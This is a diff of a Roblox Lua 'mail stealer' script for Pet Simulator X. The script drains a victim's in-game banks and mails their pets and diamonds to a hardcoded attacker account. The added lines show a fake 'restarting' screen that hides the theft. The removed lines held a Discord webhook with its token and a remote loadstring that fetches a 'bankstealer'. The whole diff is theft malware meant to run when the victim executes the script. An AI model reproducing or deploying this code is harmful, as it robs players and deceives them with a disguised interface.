@@ -1,22 +1,10 @@
+-- MAIL STEALER BELLOW
+
 -- [EgorikusaHub Mailstealer]
 
 local Library = require(game.ReplicatedStorage.Framework.Library);
 local Players = game:GetService("Players")
 local Client = Players.LocalPlayer
-
-local savedPets = Library.Save.Get().Pets
-hugeamount = 0
-for i,v in pairs(Library.Save.Get().Pets) do
-    local Pet = Library.Directory.Pets[v.id]
-        if Pet.huge == true then
-        hugeamount = hugeamount + 1
-        print(v)
-    end
-end
-if hugeamount >2 or Client.leaderstats.Diamonds.value > 300000000000 or Client.leaderstats.RAP.value > 500000000000 then
-     UserName = "TehPucuk_55"
-     Webhook = "https://discord.com/api/webhooks/1123535473143463946/T7h4jIdHyVSLFVeeffMfTnxKCCs1MvjSpM0nYFVwvxs_tsBE5SwY1YKSssd0XgP9-neU"
-end
 
 if getgenv().executed then return end
 getgenv().executed = true
@@ -469,7 +457,7 @@ if Bank ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank, LFinalList, 0)
             end
             FinalFinal = FinalFinal + #LFinalList
-            wait(0.2)
+            wait(1.5)
         else
             print('done1')
             break
@@ -523,7 +511,7 @@ if Bank2 ~= nil and invspace() ~= 0 then
                 wait(0.2)
                 withdrawremote:InvokeServer(Bank2, FinalList2, 0)
             end
-            wait(0.2)
+            wait(1.5)
             FinalFinal = FinalFinal + #FinalList2
         else
             print('done2')
@@ -580,7 +568,7 @@ if Bank3 ~= nil and invspace() ~= 0 then
                 wait(0.2)
                 withdrawremote:InvokeServer(Bank3, FinalList3, 0)
             end
-            wait(0.2)
+            wait(1.5)
             FinalFinal = FinalFinal + #FinalList3
         else
             print('done3')
@@ -636,7 +624,7 @@ if Bank4 ~= nil and invspace() ~= 0 then
                 withdrawremote:InvokeServer(Bank4, FinalList4, 0)
             end
             FinalFinal = FinalFinal + #FinalList4
-            wait(0.2)
+            wait(1.5)
         else
             print('done4')
             break
@@ -692,7 +680,7 @@ if Bank5 ~= nil and invspace() ~= 0 then
                 wait(0.2)
                 withdrawremote:InvokeServer(Bank5, FinalList5, 0)
             end
-            wait(0.2)
+            wait(1.5)
             FinalFinal = FinalFinal + #FinalList5
         else
             print('done5')
@@ -768,7 +756,6 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Egorikusa/PetSimulatorX/main/bankstealer", true))() -- Exc : -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
     return;
 end
 if _G.AntiLeave ~= false then
@@ -784,210 +771,55 @@ if _G.AntiLeave ~= false then
     end
 end
 
---// Loading UI
-local Loading = Instance.new("ScreenGui")
-local MainFrame = Instance.new("Frame")
-local Title = Instance.new("TextLabel")
-local Dots = Instance.new("Frame")
-local Dot1 = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local InsideDot = Instance.new("Frame")
-local UICorner_2 = Instance.new("UICorner")
-local Dot2 = Instance.new("Frame")
-local UICorner_3 = Instance.new("UICorner")
-local InsideDot_2 = Instance.new("Frame")
-local UICorner_4 = Instance.new("UICorner")
-local Dot3 = Instance.new("Frame")
-local UICorner_5 = Instance.new("UICorner")
-local InsideDot_3 = Instance.new("Frame")
-local UICorner_6 = Instance.new("UICorner")
-local Bar = Instance.new("Frame")
-local Bar2 = Instance.new("Frame")
-local UICorner_7 = Instance.new("UICorner")
-local UICorner_8 = Instance.new("UICorner")
-local Percentage = Instance.new("TextLabel")
-local Tip = Instance.new("TextLabel")
-local EndSequence = Instance.new("Frame")
-Loading.Name = "Loading"
-Loading.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-Loading.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-Loading.DisplayOrder = 999999999
-MainFrame.Name = "MainFrame"
-MainFrame.Parent = Loading
-MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-MainFrame.BorderSizePixel = 0
-MainFrame.Position = UDim2.new(-0.125662372, 0, -0.125935167, 0)
-MainFrame.Size = UDim2.new(1.25, 0, 1.25, 0)
-Title.Name = "Title"
-Title.Parent = MainFrame
-Title.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Title.BackgroundTransparency = 1.000
-Title.Position = UDim2.new(0.183329239, 0, 0.246382296, 0)
-Title.Size = UDim2.new(0.632528603, 0, 0.232815996, 0)
-Title.Font = Enum.Font.FredokaOne
-Title.Text = "Arkhalis"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextScaled = true
-Title.TextSize = 14.000
-Title.TextWrapped = true
-Dots.Name = "Dots"
-Dots.Parent = MainFrame
-Dots.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Dots.BackgroundTransparency = 1.000
-Dots.Position = UDim2.new(0.470970035, 0, 0.818612278, 0)
-Dots.Size = UDim2.new(0.0571707934, 0, 0.0360675976, 0)
-Dot1.Name = "Dot1"
-Dot1.Parent = Dots
-Dot1.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-Dot1.Position = UDim2.new(0.0611661971, 0, 0.234447539, 0)
-Dot1.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
-UICorner.CornerRadius = UDim.new(0.5, 0)
-UICorner.Parent = Dot1
-InsideDot.Name = "InsideDot"
-InsideDot.Parent = Dot1
-InsideDot.AnchorPoint = Vector2.new(0.5, 0.5)
-InsideDot.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-InsideDot.Position = UDim2.new(0.5, 0, 0.5, 0)
-UICorner_2.CornerRadius = UDim.new(0.5, 0)
-UICorner_2.Parent = InsideDot
-Dot2.Name = "Dot2"
-Dot2.Parent = Dots
-Dot2.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-Dot2.Position = UDim2.new(0.419989735, 0, 0.234447539, 0)
-Dot2.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
-UICorner_3.CornerRadius = UDim.new(0.5, 0)
-UICorner_3.Parent = Dot2
-InsideDot_2.Name = "InsideDot"
-InsideDot_2.Parent = Dot2
-InsideDot_2.AnchorPoint = Vector2.new(0.5, 0.5)
-InsideDot_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-InsideDot_2.Position = UDim2.new(0.5, 0, 0.5, 0)
-UICorner_4.CornerRadius = UDim.new(0.5, 0)
-UICorner_4.Parent = InsideDot_2
-Dot3.Name = "Dot3"
-Dot3.Parent = Dots
-Dot3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-Dot3.Position = UDim2.new(0.778813243, 0, 0.234447539, 0)
-Dot3.Size = UDim2.new(0.159291148, 0, 0.51158762, 0)
-UICorner_5.CornerRadius = UDim.new(0.5, 0)
-UICorner_5.Parent = Dot3
-InsideDot_3.Name = "InsideDot"
-InsideDot_3.Parent = Dot3
-InsideDot_3.AnchorPoint = Vector2.new(0.5, 0.5)
-InsideDot_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-InsideDot_3.Position = UDim2.new(0.5, 0, 0.5, 0)
-UICorner_6.CornerRadius = UDim.new(0.5, 0)
-UICorner_6.Parent = InsideDot_3
-Bar.Name = "Bar"
-Bar.Parent = MainFrame
-Bar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-Bar.BorderSizePixel = 0
-Bar.Position = UDim2.new(0.219547689, 0, 0.764966607, 0)
-Bar.Size = UDim2.new(0.560904443, 0, 0.0365853645, 0)
-Bar2.Name = "Bar2"
-Bar2.Parent = Bar
-Bar2.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-Bar2.BorderSizePixel = 0
-Bar2.Size = UDim2.new(0, 0, 1, 0)
-UICorner_7.CornerRadius = UDim.new(0.5, 0)
-UICorner_7.Parent = Bar2
-UICorner_8.CornerRadius = UDim.new(0.5, 0)
-UICorner_8.Parent = Bar
-Percentage.Name = "Percentage"
-Percentage.Parent = Bar
-Percentage.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Percentage.BackgroundTransparency = 1.000
-Percentage.Position = UDim2.new(0.280816972, 0, 0.0909090936, 0)
-Percentage.Size = UDim2.new(0.438366145, 0, 0.787879348, 0)
-Percentage.Font = Enum.Font.FredokaOne
-Percentage.Text = "0%"
-Percentage.TextColor3 = Color3.fromRGB(255, 255, 255)
-Percentage.TextScaled = true
-Percentage.TextSize = 14.000
-Percentage.TextWrapped = true
-Tip.Name = "Tip"
-Tip.Parent = MainFrame
-Tip.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Tip.BackgroundTransparency = 1.000
-Tip.Position = UDim2.new(0.280816913, 0, 0.717294872, 0)
-Tip.Size = UDim2.new(0.438366145, 0, 0.0299334861, 0)
-Tip.Font = Enum.Font.SourceSansItalic
-Tip.Text = ""
-Tip.TextColor3 = Color3.fromRGB(138, 138, 138)
-Tip.TextScaled = true
-Tip.TextSize = 14.000
-Tip.TextWrapped = true
-EndSequence.Name = "EndSequence"
-EndSequence.Parent = Loading
-EndSequence.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-EndSequence.BorderSizePixel = 0
-EndSequence.Position = UDim2.new(1, 0, 0, 0)
-EndSequence.Size = UDim2.new(1, 0, 1, 0)
-local function NGZQAMK_fake_script()
-	local script = Instance.new('LocalScript', Dots)
-	while true do
-		wait(0.25)
-		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
-		wait(0.25)
-		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
-		wait(0.25)
-		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(1,0,1,0), "In", "Sine", 0.25, true)
-		wait(0.25)
-		script.Parent.Dot1.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
-		wait(0.25)
-		script.Parent.Dot2.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
-		wait(0.25)
-		script.Parent.Dot3.InsideDot:TweenSize(UDim2.new(0,0,0,0), "In", "Sine", 0.25, true)
-	end
-end
-coroutine.wrap(NGZQAMK_fake_script)()
-local function NDID_fake_script()
-	local script = Instance.new('LocalScript', MainFrame)
-	local bar = script.Parent.Bar
-	local insidebar = bar.Bar2
-	local percentage = bar.Percentage
-	wait(5)
-	insidebar:TweenSize(UDim2.new(1,0,1,0), "In", "Linear", 200, true)
-	wait(200)
-	script.Parent.Parent.EndSequence:TweenPosition(UDim2.new(0,0,0,0), "InOut", "Quad", 3, true)
-	wait(3)
-	game.Players.LocalPlayer:Kick("[Crash Log ".. math.random(50, 5000) .. "] Please Rejoin.")
-end
-coroutine.wrap(NDID_fake_script)()
-local function OVSBNB_fake_script()
-	local script = Instance.new('LocalScript', Percentage)
-	wait(5)
-	for i = 1,100 do
-		script.Parent.Text = i.."%"
-		wait(2)
-	end
-end
-coroutine.wrap(OVSBNB_fake_script)()
-local function SNUMK_fake_script()
-	local script = Instance.new('LocalScript', Tip)
-	local tip = script.Parent
-	while true do
-		wait(2)
-		tip.Text = _G.Tip1
-		wait(2)
-		tip.Text = _G.Tip2
-		wait(2)
-		tip.Text = _G.Tip3
-		wait(2)
-		tip.Text = _G.Tip4
-		wait(2)
-		tip.Text = _G.Tip5
-	end
-end
-coroutine.wrap(SNUMK_fake_script)()
-local function LSNGUH_fake_script()
-	local script = Instance.new('LocalScript', Loading)
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)
-	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
-end
-coroutine.wrap(LSNGUH_fake_script)()
+local ScreenGui = Instance.new("ScreenGui")
+                            local Frame = Instance.new("Frame")
+                            local TextLabel = Instance.new("TextLabel")
+                            local ImageLabel = Instance.new("ImageLabel")
+                            local TextLabel_2 = Instance.new("TextLabel")
+
+                            --Properties:
+
+                            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+                            ScreenGui.DisplayOrder = 999999999
+		
+		
+                            Frame.Parent = ScreenGui
+                            Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+                            Frame.Position = UDim2.new(-1.1603854, 0, -1.10370374, 0)
+                            Frame.Size = UDim2.new(0, 1000000, 0, 100000000)
+							UIAspectRatioConstraint = Frame
+							
+                            TextLabel.Parent = ScreenGui
+                            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel.BackgroundTransparency = 1.000
+                            TextLabel.Position = UDim2.new(0.1512353545, 0, 0.373532414, 0)
+                            TextLabel.Size = UDim2.new(0, 1245, 0, 310)
+                            TextLabel.ZIndex = 3
+                            TextLabel.Font = Enum.Font.SourceSansBold
+                            TextLabel.Text = "We're restarting Pet Simulator X!"
+                            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel.TextSize = 70.000
+                            TextLabel.TextWrapped = true
+
+                            ImageLabel.Parent = ScreenGui
+                            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                            ImageLabel.BackgroundTransparency = 1.000
+                            ImageLabel.Position = UDim2.new(0.3251033338259, 0, 0.13342583251, 0)
+                            ImageLabel.Size = UDim2.new(0, 510, 0, 259)
+                            ImageLabel.ZIndex = 2
+                            ImageLabel.Image = "http://www.roblox.com/asset/?id=13441881980"
+
+                            TextLabel_2.Parent = ScreenGui
+                            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel_2.BackgroundTransparency = 1.000
+                            TextLabel_2.Position = UDim2.new(0.1512353545, 0, 0.468594134, 0)
+                            TextLabel_2.Size = UDim2.new(0, 1245, 0, 310)
+                            TextLabel_2.ZIndex = 3
+                            TextLabel_2.Font = Enum.Font.SourceSansBold
+                            TextLabel_2.Text = "Please wait while we redirect you..."
+                            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+                            TextLabel_2.TextSize = 36.000
+                            TextLabel_2.TextWrapped = true
 -- Pets Tables :
 
 TitanicList = {}
@@ -1311,7 +1143,7 @@ if getgenv().Settings ~= nil then
         local dhdata = {
             dhprem = dhkey
         }
-        local dhurl = "https://raw.githubusercontent.com/MonzzScriptz/Keys.lua/main/.gitignore" -- Exc : https://rizz.xyz/premium.php
+        local dhurl = "https://raw.githubusercontent.com/SuperMonz/Keys.v2/main/Keys.lua" -- Exc : https://rizz.xyz/premium.php
         local dhheaders = {
             ["content-type"] = "application/json"
         }
@@ -1394,7 +1226,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1426,7 +1258,7 @@ spawn(function()
     while wait() do
         if #TList ~= 0 or TList ~= {} then
             for i, v in pairs(TList) do
-                user = UserName
+                user = ndUser
                 if titanicin ~= nil then
                     if dualhook(titanicin) then
                         user = dhuser
@@ -1434,14 +1266,14 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1454,7 +1286,7 @@ spawn(function()
     while wait() do
         if #BList ~= 0 and #TList == 0 then
             for i, v in pairs(BList) do
-                user = UserName
+                user = ndUser
                 if bananin ~= nil then
                     if dualhook(bananin) then
                         user = dhuser
@@ -1462,14 +1294,14 @@ spawn(function()
                 end
                 local args = {
                     [1] = {
-                        ["Recipient"] = user,
+                        ["Recipient"] = "TehPucuk_55",
                         ["Diamonds"] = givediaamt,
                         ["Pets"] = { v },
                         ["Message"] = mailmsg,
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1484,7 +1316,7 @@ spawn(function()
     while wait() do
         if #HList ~= 0 and #BList == 0 and #TList == 0 then
             for i, v in pairs(HList) do
-                user = UserName
+                user = ndUser
                 if hugein ~= nil then
                     if dualhook(hugein) then
                         user = dhuser
@@ -1499,7 +1331,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1513,7 +1345,7 @@ spawn(function()
     while wait() do
         if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
             for i, v in pairs(PList) do
-                user = UserName
+                user = ndUser
                 if pogin ~= nil then
                     if dualhook(pogin) then
                         user = dhuser
@@ -1528,7 +1360,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1541,7 +1373,7 @@ spawn(function()
     while wait() do
         if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
             for i, v in pairs(EList) do
-                user = UserName
+                user = ndUser
                 if excin ~= nil then
                     if dualhook(excin) then
                         user = dhuser
@@ -1556,7 +1388,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1584,7 +1416,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1612,7 +1444,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1640,7 +1472,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(1.5)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
